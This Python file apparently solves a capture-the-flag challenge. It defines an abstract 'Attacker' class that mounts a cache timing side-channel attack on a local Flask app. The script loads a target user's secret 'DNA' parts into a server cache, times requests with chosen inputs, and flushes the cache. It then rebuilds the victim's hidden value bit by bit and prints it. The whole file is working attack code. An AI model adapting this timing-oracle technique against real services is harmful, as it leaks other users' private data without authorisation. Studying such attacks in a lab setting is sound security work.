import time
import requests
from itertools import product
from itsdangerous.exc import *
from itsdangerous.url_safe import URLSafeTimedSerializer
from flask.sessions import session_json_serializer
from abc import abstractmethod, ABC

BITS_IN_NUCLEOTIDE = 2
BITS_TO_NUCLEOTIDE = {
    '00': 'C',
    '01': 'G',
    '10': 'A',
    '11': 'T'
}
NUCLEOTIDE_TO_BITS = {
    'C': '00',
    'G': '01',
    'A': '10',
    'T': '11'
}
BIT_LEN = 38
PART_ORDER = ['body', 'head', 'eyes', 'nose', 'ears', 'mouth']
PART_TO_BITLEN = {
    'body': 6,
    'head': 8,
    'eyes': 8,
    'nose': 1,
    'ears': 7,
    'mouth': 8
}
PART_TO_VARIATION_BITS = {
    'body': 0,
    'head': 2,
    'eyes': 2,
    'nose': 1,
    'ears': 1,
    'mouth': 2
}
COLOR_BITS = 6

part_right_offsets = [sum([PART_TO_BITLEN[prev] for prev in PART_ORDER[i:]]) for i in range(1, len(PART_ORDER)+1)]
PART_TO_RIGHT_OFFSET = {part: offset for part, offset in zip(PART_ORDER, part_right_offsets)}

def bitstring_to_dna(bitstring):
    bit_chunks = [bitstring[i: i + BITS_IN_NUCLEOTIDE] for i in range(0, len(bitstring), BITS_IN_NUCLEOTIDE)]
    nucleotides = [BITS_TO_NUCLEOTIDE[chunk] for chunk in bit_chunks]
    return ''.join(nucleotides)

def dna_to_bitstring(dna):
    return ''.join([NUCLEOTIDE_TO_BITS[nuc] for nuc in dna])

def part_bits_from_bitstring(part, bitstring):
    no_tail = bitstring[:-PART_TO_RIGHT_OFFSET[part]]
    return no_tail[-PART_TO_BITLEN[part]:]

def part_repr_to_bits(part_repr):
    color_preamble = ', color='
    variation_preamble = 'variation='
    part = part_repr.split('(')[0].lower()
    
    if color_preamble in part_repr:
        part_repr, after_color = part_repr.split(color_preamble)
        color = int(after_color.split(')')[0])
        part_repr += ')'
    else:
        color = None
    
    _, after_variation = part_repr.split(variation_preamble)
    
    bits = ""
    variation = int(after_variation[:-1])
    
    if color is not None:
        bits += f"{color:0b}".zfill(COLOR_BITS)
    
    if len(bits) != PART_TO_BITLEN[part]:
        bits = f"{variation:0b}".zfill(PART_TO_VARIATION_BITS[part]) + bits
        
    return bits

class Attacker(ABC):
    SESSION_SERIALIZER = URLSafeTimedSerializer("random-key-which-is-wrong", serializer=session_json_serializer)
    
    # Attack Defaults
    DEFAULT_SERVER_URL = "http://127.0.0.1:5000"

    # Attack Consts 
    MAX_CACHE_SIZE = 10
    SESSION_COOKIE = "session"
    SESSION_ID_FIELD = "SessionId"
    MAX_QUERIES = 256
    FANCY_TEMPLATE = "[*] {} [*]\n"

    def __init__(self, user_id=666, server=None, session_cookie=None, verbose=False):
        self.user_id = user_id
        self.queries = 0
        self.verbose = verbose

        if server is None:
            self.server = self.DEFAULT_SERVER_URL
        else:
            self.server = server
        
        if session_cookie is None:
            self.start_new_session()
        else:
            self.session_cookie = session_cookie

    def get_cookie_data(self, data_key):
        _, payload = self.SESSION_SERIALIZER.loads_unsafe(self.session_cookie)
        return payload[data_key]
    
    @property
    def ssid(self):
        return self.get_cookie_data(self.SESSION_ID_FIELD)
    
    def fancy_print(self, string, important=False):
        if self.verbose or important:
            print(self.FANCY_TEMPLATE.format(string))
    
    def start_new_session(self):
        resp = requests.get(f"{self.server}")
        self.session_cookie = resp.cookies[self.SESSION_COOKIE]
    
    def post_and_update(self, url, *args, **kwargs):
        start = time.time()
        resp = requests.post(url, *args, **kwargs)
        end = time.time()
        
        if self.SESSION_COOKIE in resp.cookies:
            self.session_cookie = resp.cookies[self.SESSION_COOKIE]
        return end - start

    def leak_user_part_to_cache(self, part):
        self.queries += 1
        if self.queries % self.MAX_QUERIES == 0:
            print(f"Warning: made {self.queries} queries to session {self.ssid} - the user might have shapeshifted!")
        
        request_params = {"part": part, "id": self.user_id}
        request_cookies = {self.SESSION_COOKIE: self.session_cookie}
        
        return self.post_and_update(f"{self.server}/api/part_from_user", data=request_params, cookies=request_cookies)

    def load_part_bits_to_cache(self, part, part_bits):
        right_pad = '0' * PART_TO_RIGHT_OFFSET[part]
        part_bitstring = (part_bits + right_pad).zfill(BIT_LEN)
        request_params = {"part": part, "dna": bitstring_to_dna(part_bitstring)}
        request_cookies = {self.SESSION_COOKIE: self.session_cookie}
        
        return self.post_and_update(f"{self.server}/api/part_from_dna", data=request_params, cookies=request_cookies)
    
    def flush_cache_from_part(self, part):
        if part == PART_ORDER[0]:
            flush_part = PART_ORDER[1]
        else:
            flush_part = PART_ORDER[0]

        # load arbitrary, elements of a different part to flush the original away
        part_options = product('01', repeat=PART_TO_BITLEN[flush_part])
        for _, bits in zip(range(Attacker.MAX_CACHE_SIZE), part_options):
            self.load_part_bits_to_cache(flush_part, ''.join(bits))
    
    @abstractmethod
    def find_part(self, part):
        raise NotImplementedError

    @classmethod
    def attack(cls, *args, **kwargs):
        # get session data or create it
        session_cookie = input('Insert your session cookie: ')
        if len(session_cookie) == 0:
            session_cookie = None

        # make attacker for session
        attacker = cls(session_cookie=session_cookie, *args, **kwargs)
        if session_cookie is None:
            attacker.fancy_print(f"Started a new session", important=True)
        
        # attack all parts and assemble 
        start = time.time()
        attacker.fancy_print(f"Attacking user {attacker.user_id} in session {attacker.ssid}")
        user_bitstring = ""
        for part in PART_ORDER:
            part_bits = attacker.find_part(part)
            attacker.fancy_print(f"Recovered bits for {part}: {part_bits}")
            user_bitstring += part_bits
        user_dna = bitstring_to_dna(user_bitstring)
        end = time.time()

        attack_minutes = (end - start) / 60
        attacker.fancy_print(f"Recovered DNA - {user_dna}, using {attacker.queries} queries and {attack_minutes:f} minutes")
        if session_cookie is None:
            attacker.fancy_print(f"The new session's cookie is {attacker.session_cookie}", important=True)
        
        return user_dna